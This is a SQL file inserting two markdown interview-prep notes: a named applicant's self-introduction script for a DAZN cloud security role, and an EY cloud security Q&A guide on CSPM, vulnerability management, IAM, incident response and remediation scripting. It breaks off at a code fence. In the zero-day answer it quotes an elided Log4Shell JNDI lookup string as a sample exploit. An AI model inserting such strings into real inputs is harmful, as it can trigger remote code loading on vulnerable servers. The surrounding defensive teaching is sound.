-- Batch 7: 10 notes
BEGIN;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$DAZN_Self_Introduction$VELSEC$, $VELSEC$Dazn Self Introduction$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['Cloud_Security']::TEXT[], $VELSEC$# 🎤 Self-Introduction — DAZN Cloud Security Engineer

**Name:** Gopikrishna Vallepu
**Target Role:** Cloud Security Engineer — DAZN
**Duration:** 2-3 minutes

---

## 1️⃣ OPENING — WHO I AM (30 seconds)

> "Hello, I'm Gopikrishna Vallepu, a Security Analyst with approximately 4 years of experience in SOC operations, threat detection, and cloud security monitoring. I started my career building a strong foundation in networking and infrastructure during my time as a Technical Apprentice at Cisco, which gave me a deep understanding of how enterprise environments operate at scale."

---

## 2️⃣ MY JOURNEY & CURRENT ROLE (60 seconds)

> "For the past 3+ years, I've been working in SOC environments where my responsibilities evolved from basic alert triage to deeper investigation and incident handling. I work extensively with EDR/XDR platforms.
>
> **Currently at UltraViolet Cyber**, I investigate security incidents using **SecureWorks Taegis XDR** and **CrowdStrike Falcon EDR** — performing alert triage, log correlation, and deep threat analysis across endpoint, network, and **AWS cloud environments**.
>
> On the cloud security side, I contribute directly to **cloud security posture management** — identifying high-risk AWS misconfigurations such as exposed S3 buckets, overly permissive IAM policies, and open security groups, while ensuring compliance with **CIS AWS Foundations benchmarks**.
>
> I also support **Cloud Workload Protection Platform (CWPP)** operations by validating Falcon sensor deployment across **EKS clusters** and monitoring runtime detections on **EC2 and containerized workloads** — investigating suspicious process activity, privilege escalation attempts, and abnormal network behavior.
>
> During investigations, I perform **IOC-based threat hunting** — checking for malicious hashes, IP addresses, domains, or indicators associated with known data breaches. If there are signs of credential exposure or breach activity, I validate logs across multiple sources to confirm impact and scope."

---

## 3️⃣ WHY DAZN — THE HOOK (30 seconds)

> "What excites me about DAZN is the opportunity to **define and build** a cloud security function, not just inherit one. DAZN operates a global streaming platform at massive scale — that means real attack surfaces, real-time availability requirements, and engineering teams that need a security partner, not a gatekeeper.
>
> The tech stack aligns directly with my hands-on experience — **Wiz for CSPM**, **AWS-primary** with multi-cloud, **Terraform for IaC**, and **EKS for container workloads**. My background in both SOC investigation and cloud security posture management gives me the unique ability to not only detect and triage findings, but to understand the real-world exploitability behind them and drive remediation with engineering teams."

---

## 4️⃣ CLOSING — THE VALUE STATEMENT (20 seconds)

> "I bring three things to this role:
> 1. **Threat detection depth** — SIEM/XDR investigations, IOC threat hunting, and MITRE ATT&CK-mapped analysis
> 2. **Cloud security hands-on** — AWS CSPM, CIS benchmarks, EKS sensor validation, S3/IAM/SG remediation
> 3. **Engineering collaboration** — I don't just file tickets; I trace misconfigurations to their source and work directly with the teams who deploy
>
> I'm looking to further advance my career in cloud security engineering, and DAZN's role is exactly the kind of challenge I want to take on."

---

## 📝 FULL BACKGROUND NARRATIVE (Reference — Don't Memorize)

> Hello, I'm Gopikrishna Vallepu, a Security Analyst with approximately 4 years of experience in SOC operations, threat detection, and cloud security monitoring.
>
> I started my career building a strong foundation in networking and infrastructure during my time as a Technical Apprentice at Cisco. That experience helped me understand how enterprise environments operate.
>
> For the past 3+ years, I've been working in a SOC environment where my responsibilities evolved from basic alert triage to deeper investigation and incident handling. I work extensively with EDR/XDR platforms.
>
> Currently, I work at UltraViolet Cyber, where I investigate security incidents using SecureWorks Taegis XDR and CrowdStrike Falcon EDR, performing alert triage, log correlation, and deep threat analysis across endpoint, network, and AWS cloud environments.
>
> I also contribute to cloud security posture management by identifying high-risk AWS misconfigurations, such as exposed S3 buckets, overly permissive IAM policies, and open security groups, while ensuring compliance with CIS AWS Foundations benchmarks.
>
> During investigations, I also perform IOC-based threat hunting — checking for malicious hashes, IP addresses, domains, or indicators associated with known data breaches. If there are signs of credential exposure or breach activity, I validate logs across multiple sources to confirm impact and scope.
>
> In addition, I support Cloud Workload Protection Platform (CWPP) operations by validating Falcon sensor deployment across EKS clusters and monitoring CrowdStrike Falcon runtime detections on EC2 and containerized workloads, investigating suspicious process activity, privilege escalation attempts, and abnormal network behavior.
>
> Overall, my core focus is on threat detection, cloud security monitoring, incident response, and improving cloud security posture, and I'm looking to further grow in cloud security and threat detection engineering roles.
>
> With strong experience in SIEM/XDR investigations, AWS security monitoring, and threat hunting aligned with MITRE ATT&CK, I'm now looking to further advance my career in cloud security and security engineering roles.

---

## 🎯 YOUR REAL STRENGTHS — MAP TO DAZN JD

| DAZN JD Requirement | Your Real Experience | How to Frame It |
|---------------------|---------------------|-----------------|
| Wiz CSPM triage & reporting | CrowdStrike Falcon CSPM/CWPP + CIS benchmarks | "I do CSPM today with CrowdStrike — Wiz is the same discipline with a superior Security Graph. I know the workflows: triage, prioritize, remediate, report." |
| AWS vulnerability management | AWS S3/IAM/SG misconfiguration identification | "I identify and remediate AWS misconfigs daily — S3 exposure, overly permissive IAM, open SGs — against CIS AWS Foundations." |
| Container security (EKS) | Falcon sensor validation on EKS clusters, EC2 & container runtime monitoring | "I validate Falcon sensor deployment on EKS and investigate container runtime detections — privilege escalation, suspicious processes, abnormal network." |
| Cut through noise & FPs | SOC alert triage evolved from L1 → deep investigation | "I've spent 3+ years learning to tell signal from noise — SIEM/XDR triage, IOC validation, multi-source log correlation." |
| Trace misconfigs to IaC | AWS CSPM + cloud config knowledge | "I understand the cloud configs deeply; tracing to Terraform is the natural next step — I know what the resource *should* look like." |
| WAF operations | Network security monitoring + Cisco infrastructure background | "My Cisco networking foundation + current network threat analysis gives me strong context for WAF rule evaluation and tuning." |
| Threat hunting & MITRE ATT&CK | IOC-based hunting, credential breach validation, MITRE-mapped analysis | "I hunt for IOCs — hashes, IPs, domains — and map findings to MITRE ATT&CK. I validate credential exposure across multiple log sources." |
| Automation | SOC workflow automation, sensor coverage validation | "I automate repetitive security tasks — sensor coverage reconciliation, alert enrichment, compliance reporting." |

---

## ⚡ DAZN-SPECIFIC KEYWORDS TO WEAVE IN

- **"Build from the ground up"** — the JD says "define and build a cloud security function"
- **"Cut through noise"** — the JD emphasizes "cutting through noise and false positives"
- **"Trace to source"** — the JD requires "trace misconfigurations to their source in IaC"
- **"Work directly with teams"** — the JD says "working directly with the teams who deploy"
- **"Multi-cloud"** — mention AWS primary + Azure/GCP/OCI awareness
- **"Automation"** — the JD asks for "identify opportunities to automate and improve security processes"
- **"Streaming platform at scale"** — shows you've researched DAZN's business
- **"MITRE ATT&CK"** — shows threat-informed approach to cloud security
- **"IOC hunting"** — shows proactive security mindset, not just reactive alert handling

---

## 🔥 BRIDGING YOUR SOC EXPERIENCE TO CLOUD SECURITY ENGINEER

> **If they ask "You're a SOC analyst — why cloud security engineer?"**

> "My SOC experience is actually a *strength*, not a gap. Here's why:
>
> 1. **I understand threats end-to-end.** When I see a CSPM finding like 'overly permissive IAM role,' I don't just see a configuration issue — I see the attacker's next move because I've investigated real credential compromises.
>
> 2. **I know what good detection looks like.** I've tuned XDR detections, reduced false positives, and correlated multi-source signals. That's exactly what DAZN needs for Wiz triage — cutting through noise to find real risk.
>
> 3. **I've already been doing cloud security.** AWS CSPM, CIS benchmarks, EKS sensor validation, container runtime monitoring — these aren't aspirational skills, they're my current job.
>
> 4. **Cloud Security Engineer is the natural evolution.** I'm moving from *investigating* cloud security incidents to *preventing* them — from reactive SOC to proactive posture management. That's what this role is about."

---

## 🚫 THINGS TO AVOID

- ❌ Don't oversell SOC L1 work — frame it as "my responsibilities **evolved** from triage to deep investigation"
- ❌ Don't be vague about cloud experience — name specific services: S3, IAM, SGs, EKS, EC2, CIS benchmarks
- ❌ Don't say "I want to learn Wiz" — say "I do CSPM today with CrowdStrike Falcon; Wiz is the same discipline with a different platform"
- ❌ Don't say "I manage alerts" — say "I assess real-world risk and drive remediation"
- ❌ Don't separate SOC and cloud — frame them as complementary: "My threat investigation skills make me a *better* cloud security engineer"
- ❌ Don't badmouth previous tools — compare objectively: "CrowdStrike gives me runtime depth, Wiz gives me contextual attack paths — they complement each other"
- ❌ Don't say "I follow processes" — say "I build processes and teach others"

---

## 🏢 CAREER TIMELINE — QUICK REFERENCE

```
2022       Cisco — Technical Apprentice (Networking & Infrastructure)
2023-Now   UltraViolet Cyber — Security Analyst (SOC + Cloud Security)
           ├── SecureWorks Taegis XDR — Alert triage, investigation
           ├── CrowdStrike Falcon EDR — Endpoint + container detection
           ├── AWS Cloud Security — CSPM, CIS benchmarks, S3/IAM/SG
           ├── EKS/Container Security — Sensor validation, runtime monitoring
           ├── IOC Threat Hunting — Hash/IP/domain analysis, breach validation
           └── MITRE ATT&CK — Threat-informed investigation & mapping
```

---

*This is YOUR real story. Practice the 4-section version (2-3 min) until it flows naturally.*$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$EY_Cloud_Security_Interview_Prep$VELSEC$, $VELSEC$Ey Cloud Security Interview Prep$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['Cloud_Security']::TEXT[], $VELSEC$# 🛡️ EY India — Application Security / Cloud Security Engineer Interview Prep

> **Role:** Application Security / Cloud Security Engineer (4–5 Years)
> **Company:** Ernst & Young India (EY India)
> **Core Focus:** CNAPP, CSPM, CWPP, Vulnerability Management, Multi-Cloud Security (AWS/Azure/GCP)

---

## 📋 Table of Contents

1. [Role Overview & Key Themes](#-1-role-overview--key-themes)
2. [CNAPP / CSPM / CWPP Deep Dive](#-2-cnapp--cspm--cwpp-deep-dive)
3. [Cloud Security Posture Management (CSPM)](#-3-cloud-security-posture-management-cspm)
4. [Vulnerability Management Lifecycle](#-4-vulnerability-management-lifecycle)
5. [Identity & Access Management (IAM)](#-5-identity--access-management-iam)
6. [Data & Workload Security](#-6-data--workload-security)
7. [Zero-Day & Incident Response](#-7-zero-day--incident-response)
8. [SIEM Integration & Automation](#-8-siem-integration--automation)
9. [Compliance & Governance Frameworks](#-9-compliance--governance-frameworks)
10. [Stakeholder Collaboration & Communication](#-10-stakeholder-collaboration--communication)
11. [Scripting & Automation](#-11-scripting--automation)
12. [IaC Security Scanning](#-12-iac-security-scanning)
13. [Scenario-Based Interview Questions](#-13-scenario-based-interview-questions)
14. [Behavioral & Soft-Skills Questions](#-14-behavioral--soft-skills-questions)
15. [30-60-90 Day Plan for EY](#-15-30-60-90-day-plan-for-ey)

---

## 🎯 1. Role Overview & Key Themes

### What This Role Really Expects

| Theme | What They Want | How to Demonstrate |
|---|---|---|
| **CNAPP Mastery** | Hands-on with Orca Security or equivalent | Talk about alert triage, policy tuning, dashboard building |
| **Multi-Cloud** | AWS + Azure + GCP | Show breadth — IAM, networking, storage security across clouds |
| **Vulnerability Mgmt** | Full lifecycle — discover → prioritize → remediate → verify | Describe your SLA framework and risk-acceptance workflows |
| **Automation** | Python/Bash/PowerShell scripting | Share examples of automated security checks and reporting |
| **Compliance** | NIST, ISO 27001, CIS Benchmarks | Explain how you map controls and generate compliance reports |
| **Integration** | SIEM (Splunk/Sentinel) + Ticketing (Jira/ServiceNow) | Detail your experience building bi-directional integrations |
| **Stakeholder Mgmt** | Translate findings for non-security teams | Give examples of clear, actionable remediation guidance |

---

## 🔍 2. CNAPP / CSPM / CWPP Deep Dive

### Q: "What is a CNAPP and how does it unify cloud security?"

**A:** "A Cloud-Native Application Protection Platform (CNAPP) converges multiple cloud security capabilities into a single platform. It combines:

- **CSPM (Cloud Security Posture Management):** Continuously monitors cloud configurations against benchmarks (CIS, NIST) and detects misconfigurations like open security groups, unencrypted storage, or overly permissive IAM policies.
- **CWPP (Cloud Workload Protection Platform):** Protects runtime workloads — VMs, containers, serverless — by detecting vulnerabilities, malware, and anomalous behavior at the workload level.
- **CIEM (Cloud Infrastructure Entitlement Management):** Analyzes IAM permissions across cloud accounts to detect over-privileged identities and enforce least privilege.
- **IaC Scanning:** Shifts security left by scanning Terraform, CloudFormation, and ARM templates before deployment.
- **Container Security:** Image scanning, runtime monitoring, and Kubernetes admission control.

The real value of a CNAPP like **Orca Security** is its **agentless, SideScanning™** approach — it reads cloud block storage snapshots to discover vulnerabilities, misconfigurations, malware, lateral movement risk, and sensitive data exposure without installing agents on every workload."

### Q: "What is SideScanning and why is it significant?"

**A:** "Orca's SideScanning technology reads the runtime block storage of cloud instances out-of-band (without deploying agents). This means:
1. **100% coverage instantly** — no deployment gaps or agent health issues.
2. **Zero performance impact** — no CPU/memory overhead on production workloads.
3. **Deep visibility** — it can see inside containers, detect installed packages, running services, exposed secrets, and misconfigurations.

This is significant for EY because as a consulting/services firm, they likely manage multiple client environments. Agentless scanning enables rapid onboarding of new cloud accounts without coordination overhead."

### Q: "Compare Orca Security vs. Wiz vs. Prisma Cloud."

**A:**

| Capability | Orca Security | Wiz | Prisma Cloud (Palo Alto) |
|---|---|---|---|
| **Approach** | Agentless (SideScanning) | Agentless (Snapshot-based) | Agent + Agentless hybrid |
| **CSPM** | ✅ Strong | ✅ Strong | ✅ Strong |
| **CWPP** | ✅ Agentless | ✅ Agentless | ✅ Agent-based (Defender) |
| **CIEM** | ✅ Built-in | ✅ Built-in | ✅ Built-in |
| **IaC Scanning** | ✅ | ✅ | ✅ (Bridgecrew/Checkov) |
| **API Security** | ✅ | ✅ | ✅ |
| **Attack Path Analysis** | ✅ Excellent | ✅ Excellent | ✅ Good |
| **Deployment Speed** | Minutes (agentless) | Minutes (agentless) | Hours–Days (agent deploy) |
| **Best For** | Full-stack visibility, no agents | Risk prioritization, Graph | Enterprises wanting agent depth |

---

## 🏗️ 3. Cloud Security Posture Management (CSPM)

### Q: "Walk me through how you manage cloud security posture across a multi-cloud environment."

**A:** "My approach to CSPM is structured in layers:

1. **Baseline Configuration:** I establish security baselines using CIS Benchmarks for each cloud provider — CIS AWS Foundations, CIS Azure Foundations, CIS GCP Foundations. These are loaded as compliance frameworks in the CNAPP tool.

2. **Continuous Monitoring:** The CNAPP continuously scans cloud accounts and flags deviations. Common findings include:
   - **AWS:** S3 buckets without encryption-at-rest, Security Groups with `0.0.0.0/0` ingress, CloudTrail disabled in a region, root account without MFA.
   - **Azure:** NSGs with open RDP/SSH, Storage Accounts with public blob access, Key Vaults without soft-delete enabled.
   - **GCP:** Firewall rules allowing ingress from `0.0.0.0/0`, Cloud Storage buckets with `allUsers` ACL, API keys without restriction.

3. **Risk Prioritization:** Not all misconfigurations are equal. I use the CNAPP's risk scoring (factoring in asset exposure, data sensitivity, and exploitability) to prioritize remediation. A public-facing EC2 instance with an exploitable CVE and an overly permissive IAM role is far more critical than an internal dev instance with a minor config gap.

4. **Remediation Workflow:** High/Critical findings are auto-ticketed to Jira/ServiceNow with remediation steps, SLA timers, and escalation rules. Medium/Low findings are batched into weekly reports for the respective cloud teams.

5. **Policy Enforcement:** I implement preventive guardrails — AWS SCPs, Azure Policies, GCP Organization Policies — to prevent insecure configurations from being deployed in the first place."

### Q: "How do you handle false positives in CSPM?"

**A:** "False positive management is a critical part of the role. My process:

1. **Investigate the Finding:** Verify whether the flagged configuration is truly insecure in the context of the environment. Example: A CNAPP flags a public S3 bucket, but it's intentionally hosting a static website — this is a false positive.

2. **Document the Exception:** I create a formal risk-acceptance record that includes:
   - The specific finding ID and description.
   - Business justification for the exception.
   - Compensating controls in place (e.g., CloudFront with OAI restricts direct bucket access).
   - Risk owner sign-off and review date.

3. **Suppress in the Tool:** I apply a scoped suppression rule in the CNAPP — limited to that specific asset and that specific check. I never apply broad suppressions.

4. **Periodic Review:** All exceptions are reviewed quarterly to validate they're still warranted. Business context changes — what was acceptable 6 months ago might not be today."

---

## 🔄 4. Vulnerability Management Lifecycle

### Q: "Describe your end-to-end vulnerability management lifecycle."

**A:** "I follow a structured 6-phase lifecycle:

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│  1. DISCOVER  │───▶│  2. ASSESS   │───▶│ 3. PRIORITIZE│
│  Scan assets  │    │  Validate    │    │  Risk-rank   │
│  and configs  │    │  findings    │    │  with context │
└──────────────┘    └──────────────┘    └──────────────┘
        ▲                                       │
        │                                       ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│  6. REPORT   │◀───│  5. VERIFY   │◀───│ 4. REMEDIATE │
│  Metrics &   │    │  Re-scan &   │    │  Patch/Fix   │
│  dashboards  │    │  validate    │    │  or mitigate │
└──────────────┘    └──────────────┘    └──────────────┘
```

**Phase Details:**

1. **Discover:** CNAPP (Orca/Wiz) scans all cloud assets — VMs, containers, serverless, IaC templates. Native tools (AWS Inspector, Azure Defender, GCP SCC) provide supplementary scanning.

2. **Assess:** Validate that findings are real. Check CVE applicability (is the vulnerable library actually loaded at runtime? Is the vulnerable port actually exposed?). This is where the CNAPP's context-aware risk scoring is invaluable.

3. **Prioritize:** I use a risk-based approach, not just CVSS alone. Factors:
   - **Exploitability:** Is there a public exploit (check KEV catalog)?
   - **Exposure:** Is the asset internet-facing?
   - **Data Sensitivity:** Does it process PII or financial data?
   - **Blast Radius:** Can an attacker pivot laterally from here?

4. **Remediate:** Work with app owners to patch, upgrade, or apply compensating controls. I define clear SLAs:
   - **Critical (CVSS 9.0+ & exploitable):** 24–48 hours
   - **High:** 7 days
   - **Medium:** 30 days
   - **Low:** 90 days

5. **Verify:** Re-scan to confirm the fix is effective. Close the ticket only after verification.

6. **Report:** Executive dashboards showing MTTR (Mean Time to Remediate), open vulnerability count by severity, SLA compliance rates, and trend analysis."

### Q: "How do you shape remediation SLAs and build-breaking policies?"

**A:** "SLAs must be realistic, measurable, and enforceable. My approach:

- **Tiered SLAs:** Based on risk rating (not just CVSS). A Critical CVE on a public-facing prod system gets a tighter SLA than the same CVE on an air-gapped dev box.
- **Build-Breaking Policies:** In CI/CD pipelines, I integrate CNAPP/SAST/SCA scans that **fail the build** if Critical or High vulnerabilities are detected in the artifact. This is the strongest shift-left enforcement.
- **Exception Process:** Teams can request a time-limited exception with business justification + compensating controls. These are tracked and auto-expire.
- **Escalation:** If an SLA is breached, the ticket auto-escalates to the team lead → director → CISO. Repeated SLA breaches trigger a process review with the team."

---

## 🔐 5. Identity & Access Management (IAM)

### Q: "How do you secure IAM across multi-cloud?"

**A:**

| Principle | AWS | Azure | GCP |
|---|---|---|---|
| **Least Privilege** | IAM Access Analyzer, unused permissions removal | Azure AD PIM (Just-in-Time) | IAM Recommender |
| **MFA Enforcement** | IAM Policy conditions, SCP denying no-MFA | Conditional Access Policies | Context-Aware Access |
| **Service Account Control** | Rotate access keys, prefer IAM Roles | Managed Identities (no creds) | Service Account key rotation |
| **Cross-Account** | AWS Organizations + SCPs, AssumeRole | Azure Lighthouse, RBAC | GCP Resource Manager, IAM bindings |
| **Monitoring** | CloudTrail + GuardDuty IAM findings | Azure AD Sign-in Logs, Sentinel | Cloud Audit Logs + SCC |
| **CIEM** | CNAPP identifies over-permissioned roles | Entra Permissions Management | CNAPP native CIEM |

### Q: "How would you detect and respond to compromised credentials in the cloud?"

**A:** "Detection signals include:
- **Impossible travel:** Login from India, then API calls from Eastern Europe within minutes.
- **Anomalous API calls:** A developer IAM user suddenly calling `ec2:RunInstances` or `iam:CreateUser`.
- **Programmatic access from new IP:** Access key used from an IP not in the corporate CIDR.

**Response:**
1. **Disable the credential immediately** — deactivate access keys, revoke active sessions.
2. **Quarantine the principal** — attach Deny-All IAM policy.
3. **Investigate scope** — CloudTrail audit for all actions performed with the compromised credential. Check for persistence mechanisms (new IAM users, roles, Lambda functions, backdoor keys).
4. **Remediate** — rotate all credentials, review and tighten permissions, patch the initial vector (phished creds? leaked in code repo?).
5. **Post-incident review** — update detection rules and share findings with the SOC/CTI team."

---

## 🗃️ 6. Data & Workload Security

### Q: "How do you protect 'the crown jewels' — sensitive data in the cloud?"

**A:** "A layered defense approach:

1. **Discovery & Classification:** Use CNAPP's data discovery module (or native tools like AWS Macie, Azure Purview, GCP DLP API) to scan for sensitive data — PII, PHI, financial records, secrets, keys.

2. **Encryption:**
   - **At Rest:** Enforce KMS-managed encryption on all storage (S3, EBS, RDS, Azure Blob, GCS buckets). Use customer-managed keys (CMK) for sensitive workloads.
   - **In Transit:** TLS 1.2+ everywhere. Enforce HTTPS-only policies on storage services.

3. **Access Controls:** S3 bucket policies, Azure RBAC on storage, GCS IAM — all following least privilege. Block public access at the account/subscription/organization level.

4. **DLP (Data Loss Prevention):** Inspect egress traffic for sensitive data patterns. Integrate DLP policies with email gateways, SaaS tools, and cloud storage.

5. **Monitoring:** Alert on unauthorized access patterns, abnormal data download volumes, or access from unusual locations.

### Q: "How do you secure containerized workloads?"

**A:** "Full lifecycle protection:

- **Build Time:** Scan container images in CI/CD for OS and library vulnerabilities. Block images with Critical CVEs from being pushed to the registry.
- **Registry:** Periodic scanning of all images in ECR/ACR/GCR. Remove stale and vulnerable images.
- **Admission Control:** Kubernetes Admission Controllers (OPA/Gatekeeper or CNAPP-native) enforce policies — no `privileged: true`, no root containers, required resource limits, approved registries only.
- **Runtime:** CWPP monitors for drift (new processes not in the original image), cryptominers, reverse shells, and anomalous network connections.
- **Network:** Kubernetes Network Policies and service mesh (Istio) to enforce micro-segmentation between pods/namespaces."

---

## 🚨 7. Zero-Day & Incident Response

### Q: "A zero-day vulnerability (like Log4Shell) is disclosed. Walk me through your response."

**A:** "Zero-day response is time-critical. My playbook:

**Hour 0–2 (Assessment):**
- Get the CVE details, affected versions, and exploitation vector.
- Use the CNAPP to immediately query: 'Which of our assets have the vulnerable library installed?' — Orca/Wiz can answer this in minutes because they've already indexed all installed packages.
- Generate a blast-radius report: How many assets? Which environments (prod/staging/dev)? Internet-facing?

**Hour 2–8 (Containment & Prioritization):**
- For directly exploitable internet-facing systems: Apply WAF rules (virtual patching) to block known exploit signatures.
- Notify asset owners through automated Jira tickets with severity, impact, and remediation steps.
- If a patch exists: Prioritize patching internet-facing prod systems. If no patch: Apply compensating controls (network segmentation, disable the vulnerable feature, WAF rules).

**Hour 8–48 (Remediation):**
- Track patching progress against the Critical SLA (24–48 hours for Critical).
- Coordinate with the SOC/CTI team: Are we seeing active exploitation attempts? Update detection rules in SIEM.

**Post-Event (After 48 Hours):**
- Re-scan all assets to verify remediation completeness.
- Conduct a lessons-learned review: How fast did we detect? What was our MTTR? How can we improve?
- Update runbooks and IR playbooks with this scenario."

### Q: "How do you differentiate between a true zero-day and a hyped vulnerability?"

**A:** "I evaluate:
1. **CISA KEV (Known Exploited Vulnerabilities) Catalog:** Is it listed? If yes, it's actively exploited.
2. **EPSS Score (Exploit Prediction Scoring System):** High EPSS = high probability of exploitation in the wild.
3. **Attack Complexity:** Is exploitation trivial (like Log4Shell's `${jndi:ldap://...}`) or does it require local access, user interaction, or specific configurations?
4. **Our Exposure:** Even a critical CVE is low-risk if none of our assets are affected. The CNAPP answers this instantly.
5. **Vendor Advisory:** What does the vendor say? Is there a patch or workaround?

I communicate this risk assessment clearly to leadership — not every 'Critical' CVE warrants a 2 AM war room."

---

## 🔗 8. SIEM Integration & Automation

### Q: "How do you integrate a CNAPP with SIEM and ticketing tools?"

**A:** "Integration architecture:

```
┌─────────────┐      ┌─────────────┐      ┌─────────────┐
│  CNAPP       │─────▶│   SIEM       │─────▶│   SOAR       │
│ (Orca/Wiz)  │ API  │ (Splunk/    │ Auto │ (Automated   │
│              │ Push │  Sentinel)  │ Play │  Response)   │
└─────────────┘      └─────────────┘      └─────────────┘
       │                                          │
       │              ┌─────────────┐             │
       └─────────────▶│  Ticketing   │◀────────────┘
               API    │ (Jira/SNOW) │  Auto-Create
                      └─────────────┘
```

**SIEM Integration (Splunk/Sentinel):**
- CNAPP findings are pushed via API/webhook to SIEM.
- I create custom correlation rules — e.g., if a CNAPP alert for 'public-facing asset with critical CVE' correlates with a GuardDuty alert for 'anomalous API call' on the same asset → escalate to P1.
- Dashboards in SIEM show unified cloud security posture.

**Ticketing (Jira/ServiceNow):**
- Critical and High findings auto-create tickets with:
  - Affected asset, finding description, remediation steps.
  - SLA timer based on severity.
  - Auto-assignment to the responsible team/owner (based on asset tagging).
- Bi-directional sync: When a ticket is resolved, the CNAPP finding is re-verified and auto-closed if remediated.

**Automation Examples:**
- **Auto-Remediation:** If a Security Group is opened to `0.0.0.0/0`, a Lambda function automatically reverts it and notifies the owner.
- **Alert Enrichment:** SOAR playbook enriches CNAPP alerts with threat intel (VirusTotal, Shodan) before creating the ticket."

---

## 📜 9. Compliance & Governance Frameworks

### Q: "How do you monitor and ensure compliance with NIST, ISO 27001, and CIS Benchmarks?"

**A:**

| Framework | What It Covers | How I Use It |
|---|---|---|
| **CIS Benchmarks** | Specific technical checks per cloud provider | Primary CSPM baseline — mapped as policies in the CNAPP. Every failing check = a finding with remediation guidance. |
| **NIST CSF** | Identify → Protect → Detect → Respond → Recover | Organizational framework — I map our cloud security program to these functions and report coverage. |
| **NIST 800-53** | Detailed security controls | Map CNAPP findings to specific 800-53 controls (e.g., AC-2 for IAM, SC-28 for encryption). |
| **ISO 27001** | Information Security Management System (ISMS) | Ensure cloud controls satisfy Annex A requirements. CNAPP compliance reports feed directly into audit evidence. |

**Process:**
1. Map the compliance framework's controls to specific cloud configurations.
2. Load or customize the compliance framework in the CNAPP.
3. Run continuous compliance assessments — not just point-in-time audits.
4. Generate compliance reports for auditors showing pass/fail status, evidence, and remediation plans for gaps.
5. Track compliance score trends over time — the goal is continuous improvement."

### Q: "How do you enforce governance across multiple cloud accounts/subscriptions?"

**A:**
- **AWS:** Organizations + SCPs to enforce guardrails (e.g., deny deletion of CloudTrail, require encryption, restrict regions).
- **Azure:** Management Groups + Azure Policies (deny non-compliant resources, auto-remediate configs).
- **GCP:** Organization Policies (restrict resource locations, enforce uniform bucket-level access).
- **Cross-Cloud:** CNAPP provides a unified governance view across all three clouds with consistent policy enforcement."

---

## 🤝 10. Stakeholder Collaboration & Communication

### Q: "How do you translate complex security findings for non-security teams?"

**A:** "This is one of the most important skills. My approach:

1. **Lead with business impact, not CVE numbers:** Instead of 'CVE-2024-XXXX with CVSS 9.8 found on asset X,' I say: 'Your production database server is running an outdated version of OpenSSL. An attacker on the internet could exploit this to decrypt sensitive customer data. Here's exactly how to fix it.'

2. **Provide actionable remediation:** Don't just say 'patch it.' Provide the exact command, configuration change, or Terraform update needed. Include before/after examples.

3. **Risk-ranked reports:** App owners see only findings relevant to their assets, sorted by priority. They don't need to sift through 500 findings — they see their top 10.

4. **Office Hours:** I hold weekly 'Security Office Hours' where teams can bring questions, discuss findings, and get help with remediation. This builds trust and reduces the adversarial perception of security."

### Q: "How do you collaborate with the SOC and CTI teams?"

**A:**
- **SOC:** I ensure CNAPP findings feed into the SOC's SIEM. I validate whether cloud-specific alerts (GuardDuty, CNAPP) correlate with SOC detections. I help SOC analysts understand cloud context.
- **CTI (Cyber Threat Intelligence):** When a new threat campaign targets cloud infrastructure (e.g., SCARLETEEL targeting AWS credentials via compromised containers), I work with CTI to validate exposure, update detection rules, and hunt for IOCs in our environment.
- **Offensive Security (Red Team):** I review red team findings to understand attack paths and validate that our CNAPP detects the simulated attacks. This feeds back into improving our detection coverage."

---

## 🤖 11. Scripting & Automation

### Q: "Give examples of how you've used scripting to automate cloud security."

**A:** "Python and Bash are my primary tools:

**Example 1 — Automated Compliance Daily Report (Python + Boto3):**
```python
import boto3
import json
from datetime import datetime

def generate_compliance_report():
    securityhub = boto3.client('securityhub')
    findings = securityhub.get_findings(
        Filters={
            'ComplianceStatus': [{'Value': 'FAILED', 'Comparison': 'EQUALS'}],
            'SeverityLabel': [{'Value': 'CRITICAL', 'Comparison': 'EQUALS'},
                             {'Value': 'HIGH', 'Comparison': 'EQUALS'}]
        }
    )
    # Parse, format, and send daily email/Slack report
    report = {
        'date': datetime.now().isoformat(),
        'total_critical': len([f for f in findings['Findings'] if f['Severity']['Label'] == 'CRITICAL']),
        'total_high': len([f for f in findings['Findings'] if f['Severity']['Label'] == 'HIGH']),
        'findings': findings['Findings']
    }
    return report
```

**Example 2 — Auto-Remediate Public S3 Buckets (Python + Lambda):**
```python
import boto3

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    bucket_name = event['detail']['requestParameters']['bucketName']
    
    # Block public access
    s3.put_public_access_block(
        Bucket=bucket_name,
        PublicAccessBlockConfiguration={
            'BlockPublicAcls': True,
            'IgnorePublicAcls': True,
            'BlockPublicPolicy': True,
            'RestrictPublicBuckets': True
        }
    )
    # Notify via SNS
    sns = boto3.client('sns')
    sns.publish(
        TopicArn='arn:aws:sns:us-east-1:123456789:SecurityAlerts',
        Message=f'Public access blocked on bucket: {bucket_name}'
    )
```

**Example 3 — PowerShell Azure NSG Audit:**
```powershell
# Audit all NSGs for rules allowing inbound from Any source
$nsgs = Get-AzNetworkSecurityGroup
foreach ($nsg in $nsgs) {
    $riskyRules = $nsg.SecurityRules | Where-Object {
        $_.Direction -eq "Inbound" -and
        $_.SourceAddressPrefix -eq "*" -and
        $_.Access -eq "Allow"
    }
    if ($riskyRules) {
        Write-Output "⚠️ NSG '$($nsg.Name)' has open inbound rules:"
        $riskyRules | ForEach-Object { Write-Output "  - $($_.Name): Port $($_.DestinationPortRange)" }
    }
}
```"

---

## 🏗️ 12. IaC Security Scanning

### Q: "How do you integrate IaC security scanning into the DevSecOps pipeline?"

**A:** "IaC scanning is a key shift-left strategy:

**Tools:**
- **Checkov** (open-source by Bridgecrew/Prisma): Scans Terraform, CloudFormation, Kubernetes manifests, Dockerfile.
- **tfsec** / **Trivy config**: Terraform-specific scanning.
- **KICS**: Multi-framework scanner (Terraform, ARM, Ansible, Kubernetes).
- **CNAPP-native IaC scanning**: Orca, Wiz, Prisma all support IaC scanning integrated into CI/CD.

**Pipeline Integration:**
```
